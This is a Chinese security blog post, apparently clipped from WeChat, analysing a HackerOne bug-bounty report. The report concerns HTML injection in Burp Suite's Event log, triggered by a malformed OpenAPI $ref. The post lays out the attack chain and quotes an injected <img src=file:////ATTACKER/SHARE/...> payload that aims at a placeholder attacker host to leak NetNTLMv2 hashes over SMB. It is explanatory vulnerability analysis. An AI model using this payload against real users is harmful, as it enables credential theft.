---
title: 【微信】观Hackerone大佬操作之朴实无华的HTML注入
source: https://mp.weixin.qq.com/s/h-CulzpGGMw7byCoV2ANnw
source_host: mp.weixin.qq.com
clip_date: 2026-11-14T09:50:19+08:00
trace_id: 8705aa3e-b813-49a2-88c2-f820e01105c5
content_hash: 909ab7e5f6face2873e4829268ea630e51c5e21e0d4e0f72387e0570b01cb6d9
status: synced
tags:
  - 微信
  - 漏洞分析
  - Windows逆向
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: TL;DR：HackerOne 上一个 Burp HTML 注入漏洞（1000 美元赏金）——解析报错信息被原样拼入 HTML，JEditorPane 渲染 `<img src="file:///UNC路径">` 触发 NTLM 认证泄露。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 41875244-d011-81bf-918a-fc77c63a4a28
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：HackerOne 上一个 Burp HTML 注入漏洞（1000 美元赏金）——解析报错信息被原样拼入 HTML，JEditorPane 渲染 `<img src="file:///UNC路径">` 触发 NTLM 认证泄露。
> 
> - **漏洞链条：** 攻击者构造含畸形 `$ref` 的恶意 OpenAPI JSON → 受害者在 Burp Repeater 中右键 "Save OpenAPI requests to site map" → 解析异常信息夹带攻击者字符串 → Event log 将其拼进 HTML → 受害者点开报错即中招。
> - **核心原因：** Burp 把"程序自身生成的报错信息"视为可信内容直接塞进 HTML，但报错里混着攻击者的原始字符串（如 `http://127.0.0.1:1/><img src=...>`）。
> - **技术本质：** Event log 详情区用的 JEditorPane 渲染 text/html；开发者虽自定义了 HTMLEditorKit 的 view factory，但图片元素仍交给 Swing 默认 ImageView，其对任意 src 照单全收。
> - **利用效果：** `<img src="file:////攻击者IP/共享/image.gif">` 在 Windows 上被解析为 UNC 路径，受害者自动发起 SMB 连接，NetNTLMv2 挑战响应被送到攻击者手中。
> - **作者点评：** 利用难度较高（需受害者手动两步操作），但攻击思路巧妙；作者感慨 AI 辅助挖洞虽高效，但此类"组合型漏洞"仍难被常规思路发现。

**安全无界** *2026年11月11日 11:00*

> 声明：请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

不知道大家有没有和我一样的感觉，那就是使用AI挖洞多了，整个人都有点呆木了，一个需求过来不管它是啥，第一想法就是让AI先跑跑（不过有一说一，在某些点上AI确实比古法利索，比如内网横向，AI能很快将一些散落的点拼接起来形成攻击链，要是换成古法，这个速度就不好说了）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4cd72fade0c1e64c.png)

好了，言归正传，刚好最近有空，这不又上hackerone来看看大佬的姿势，学习学习。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0f89a53f44f5b846.png)

小小浏览了几下，一眼就看上了这个Burp的HTML注入，之所以关注到他，主要还是他的标题显眼“从HTML注入到触发SMB身份验证”。emmmm，当然还有1000刀（哈哈，看人真准，就是好奇啥HTML注入咋给这多呢）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/33d2050ff6be89ac.png)

## 先看攻击链

整体过了一遍，大致链路是这样：

```perl
攻击者构造一个”看起来很正常”的 OpenAPI JSON
        │
        ▼
受害者在 Repeater 里收到这个响应
        │  右键 → Save OpenAPI requests to site map
        ▼
OpenAPI 解析失败（畸形 $ref）→ 抛出异常
        │  异常信息里夹着攻击者的字符串
        ▼
Event log 把异常信息原样拼进 HTML
        │  受害者点开这条报错
        ▼
JEditorPane 渲染 → 遇到 <img src=”file:////攻击者/共享/xx.gif”>
        │
        ▼
Windows：UNC 路径？我去连一下！
        │
        ▼
NTLM 认证 → NetNTLMv2 挑战响应送到攻击者手里
```

emmmmmmm，只能说这利用难度还是有点大呀，得受害者亲自配合两步操作，才能打到自己头上，当然只要攻击链能成，管他难度大不大，嘎嘎给钱就完事啦，哈哈，不开玩笑了，简单分析一下原因。

## 原因分析

问题的根源其实就一句话：Burp 把"解析失败的报错信息"当成了可信内容，直接塞进了 HTML。

单看流程，每一步都很合理：

```perl
用户对该响应执行 Save OpenAPI requests to site map
响应内容有问题，解析失败
把失败原因写进 Event log，方便排查
```

开发者的心理活动大概是：报错信息嘛，程序自己生成的，能有什么问题？问题在于，报错信息里混着攻击者提供的原始字符串。解析器报错时，会生成类似这样的一句话（ATTACKER / SHARE 为占位符）：

```xml
Blocking URL resolution for 'http://127.0.0.1:1/><img src=file:////ATTACKER/SHARE/image.gif>'.
```

攻击者的字符串，被原封不动地放进了报错消息里。

## 核心漏洞点：日志面板其实是个"迷你浏览器"

Event log 详情区用的是 Java Swing 的 JEditorPane，它渲染的是 text/html。开发者自定义了 HTMLEditorKit 的 view factory，改了段落的处理方式，但图片元素还是交给了 Swing 默认的ImageView。而 ImageView 的职责非常单纯：给我一个 src，我就去把图拿回来。

那如果 src 是这个呢：

```cs
file:////攻击者IP/共享名/image.gif
```

Windows 就会把它当成 UNC 路径 \\攻击者IP\\共享名\\image.gif。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c565a2f55ae65211.png)

虽然这个漏洞整体利用起来复杂度挺高的，但是思路还是挺有意思的，估计我是很难找到这么个点，哈哈，除非动用AI伟力。

实战案例 · 目录
